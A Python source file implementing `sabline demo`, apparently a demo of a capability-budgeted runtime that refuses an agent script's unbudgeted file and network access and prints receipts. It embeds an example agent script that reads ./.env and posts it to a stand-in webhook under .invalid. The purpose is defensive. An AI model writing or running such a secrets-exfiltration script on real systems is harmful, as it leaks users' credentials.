"""`sabline demo` (8.5): one refusal and one run inside a budget, with their
receipts, in under a minute and with nothing to read first.

It takes no argument but --keep, reaches no network and touches no file of
yours. Everything it uses it writes itself, into a directory it has just
made: a `.env` whose one value is made up, a script of the kind an agent
writes - read ./.env, post it to a webhook - and the same task rewritten to
stay inside a budget. It runs the first with no budget given, which is io,
and shows the refusal, its line and its receipt; runs the second under a
budget that names one file to read and one directory to write; and prints
what differs between the two receipts.

That it cannot be turned on a real `.env` is by construction, and
check_demo.py holds each part: the directory is new (mkdtemp) and the runs
start in it, so `./.env` is the file written here; no path, URL, budget or
program is taken from the command line, the environment or the directory it
was started in; the first run is given no --allow, so both the read and the
post are refused whatever is on the disk; and the webhook's host is under
`.invalid`, which no resolver answers for (RFC 6761).
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile

from .version import _launch_command
from .viewer import receipts_compared
from typing import Any

DEMO_ENV = ("# written by `sabline demo`; nothing here is real\n"
            "API_KEY=demo-0000-not-a-real-key\n")

AGENT_SCRIPT = '''// The kind of script an agent writes when asked to "report the config".
// It reads ./.env and posts it to a webhook.

fn main() uses io, fs, net {
    print("collecting configuration...")
    check read_file("./.env") {
        ok found {
            check post("https://webhook.invalid/collect", found) {
                ok answer {
                    print("sent")
                }
                fail why {
                    print("could not send: " + why)
                }
            }
        }
        fail why {
            print("no .env here: " + why)
        }
    }
}
'''

INSIDE_BUDGET = '''// The same task, inside a budget: report on the configuration from a file
// that is meant to be read, into a file, and send nothing anywhere.

fn main() uses io, fs {
    check read_file("settings.txt") {
        ok found {
            let names: List of Text = []
            for line in split(found, "\\n") {
                if contains(line, "=") {
                    names = push(names, get(split(line, "="), 0))
                }
            }
            write_file("out/report.txt", format("{} setting(s) are configured\\n", length(names)))
            print(format("{} setting(s); the report is in out/report.txt", length(names)))
        }
        fail why {
            print("no settings.txt here: " + why)
        }
    }
}
'''

SETTINGS = "region=westeurope\nlog_level=info\nretries=3\n"
REFUSED_RECEIPT = "refused.receipt.json"
ALLOWED_RECEIPT = "allowed.receipt.json"


def _run(args: list[str], cwd: str) -> tuple[int, str, str]:
    proc = subprocess.run(_launch_command() + args, cwd=cwd,
                          stdin=subprocess.DEVNULL, capture_output=True,
                          timeout=120)
    return (proc.returncode,
            proc.stdout.decode("utf-8", "replace").replace("\r\n", "\n"),
            proc.stderr.decode("utf-8", "replace").replace("\r\n", "\n"))


def _receipt(path: str) -> dict[str, Any]:
    try:
        with open(path, encoding="utf-8") as fh:
            doc = json.load(fh)
        return doc if isinstance(doc, dict) else {}
    except (OSError, ValueError):
        return {}


def _receipt_line(doc: dict[str, Any], here: str) -> str:
    p = doc.get("predicate") or {}
    exit_ = p.get("exit") or {}
    said = [str(exit_.get("outcome"))]
    for r in p.get("refusals") or []:
        said.append(f"{r.get('code')} ({r.get('effect')}) at line "
                    f"{r.get('line')}")
    used = [f"{_short(g.get('grant'), here)} x{g.get('times')}"
            for g in p.get("grants_used") or []]
    said.append("grants used: " + (", ".join(used) if used else "none"))
    said.append(f"confinement {(p.get('run_parameters') or {}).get('confinement')}")
    return "; ".join(said)


def _short(text: Any, here: str) -> str:
    """A grant or a budget with this demo's own directory written as `.`."""
    out = str(text)
    for root in {here, os.path.normcase(here), os.path.realpath(here),
                 os.path.normcase(os.path.realpath(here))}:
        out = out.replace(root + os.sep, "./").replace(root, ".")
    return out.replace("\\", "/")


def _indent(text: str) -> list[str]:
    return ["   " + line for line in text.rstrip("\n").split("\n") if line]


def demo_main(argv: list[Any]) -> int:
    """sabline demo [--keep]"""
    if any(a != "--keep" for a in argv):
        print("usage: sabline demo [--keep]\n  it takes no program, path, "
              "address or budget: it writes what it runs", file=sys.stderr)
        return 2
    keep = "--keep" in argv
    here = os.path.realpath(tempfile.mkdtemp(prefix="sabline-demo-"))
    try:
        return _demo(here, keep)
    finally:
        if not keep:
            shutil.rmtree(here, ignore_errors=True)


def _demo(here: str, keep: bool) -> int:
    files = {".env": DEMO_ENV, "agent_script.vel": AGENT_SCRIPT,
             "inside_budget.vel": INSIDE_BUDGET, "settings.txt": SETTINGS}
    for name, text in files.items():
        with open(os.path.join(here, name), "w", encoding="utf-8",
                  newline="\n") as fh:
            fh.write(text)
    os.mkdir(os.path.join(here, "out"))
    out = [f"sabline demo: one task, run twice, in {here}", ""]

    out.append("1. A script that reads ./.env and posts it to a webhook. No "
               "budget is given, so it gets io:")
    out.append("")
    out.append(f"   $ sabline agent_script.vel --receipt {REFUSED_RECEIPT}")
    status, printed, errors = _run(
        ["agent_script.vel", "--receipt", REFUSED_RECEIPT], here)
    first = _receipt(os.path.join(here, REFUSED_RECEIPT))
    out += _indent(printed)
    refusal: dict[str, Any] = next(
        iter((first.get("predicate") or {}).get("refusals") or []), {})
    line_no = refusal.get("line")
    source = AGENT_SCRIPT.split("\n")
    if isinstance(line_no, int) and 0 < line_no <= len(source):
        out.append(f"   line {line_no}: {source[line_no - 1].strip()}")
    out += _indent("\n".join(errors.split("\n")[:2]))
    out.append(f"   exit {status}. receipt: {_receipt_line(first, here)}")
    out.append("")

    budget = "io,fs:read:settings.txt,fs:write:out"
    out.append("2. The same task inside a budget: one file to read, one "
               "directory to write, no network:")
    out.append("")
    out.append(f"   $ sabline inside_budget.vel --allow {budget} --receipt "
               f"{ALLOWED_RECEIPT}")
    status2, printed2, errors2 = _run(
        ["inside_budget.vel", "--allow", budget, "--receipt",
         ALLOWED_RECEIPT], here)
    second = _receipt(os.path.join(here, ALLOWED_RECEIPT))
    out += _indent(printed2) + _indent(errors2)
    out.append(f"   exit {status2}. receipt: {_receipt_line(second, here)}")
    out.append("")

    out.append("3. What differs between the two receipts:")
    out.append("")
    out += ["   " + _short(line, here)
            for line in receipts_compared(first, second)]
    out.append("")
    if keep:
        out.append(f"The files are in {here}; `sabline receipt show "
                   f"{REFUSED_RECEIPT}` there renders a receipt as a page.")
    else:
        out.append("Nothing is left behind; `sabline demo --keep` leaves "
                   "the two programs and their receipts to read.")
    print("\n".join(out))
    held = (status == 1 and refusal.get("code") == "E310"
            and status2 == 0
            and (second.get("predicate") or {}).get("exit", {})
            .get("outcome") == "ok")
    if not held:
        print("sabline demo: this did not go as it should have - the first "
              "run should be refused with E310 and the second should run. "
              "Please report it, with the output above.", file=sys.stderr)
        return 1
    return 0
